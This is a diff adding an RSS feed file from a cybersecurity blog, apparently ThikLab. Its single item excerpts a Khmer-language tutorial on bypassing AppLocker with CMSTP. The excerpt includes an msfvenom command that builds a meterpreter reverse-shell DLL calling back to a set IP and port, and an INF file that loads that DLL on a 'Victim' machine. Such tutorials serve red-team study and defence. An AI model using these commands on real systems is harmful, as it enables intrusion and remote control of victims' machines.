@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>sct on ThikLab - CyberSec</title>
+    <link>https://thiklab.com/en/tags/sct/</link>
+    <description>Recent content in sct on ThikLab - CyberSec</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
+    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <lastBuildDate>Sat, 03 Dec 2022 02:00:06 +0700</lastBuildDate>
+    
+        <atom:link href="https://thiklab.com/en/tags/sct/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>AppLocker Bypass - CMSTP</title>
+        <link>https://thiklab.com/en/posts/applocker-cmstp-bypass/</link>
+        <pubDate>Sat, 03 Dec 2022 02:00:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Sat, 03 Dec 2022 02:00:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/applocker-cmstp-bypass/</guid>
+        <description>ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវីនដូ៖
+1 2  C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង Blog របស់គាត់។
+DLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។
+1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &amp;gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។
+1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\Users\Victim\idm.dll [Strings] AppAct = &amp;#34;SOFTWARE\Microsoft\Connection Manager&amp;#34; ServiceName=&amp;#34;idm&amp;#34; ShortSvcName=&amp;#34;idm&amp;#34;   រក្សាទុកជា &amp;ldquo;idm-service.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>bypass</category>
+            
+          
+            
+              <category>inf</category>
+            
+          
+            
+              <category>sct</category>
+            
+          
+        
+        
+          
+            
+              <category>CMSTP</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
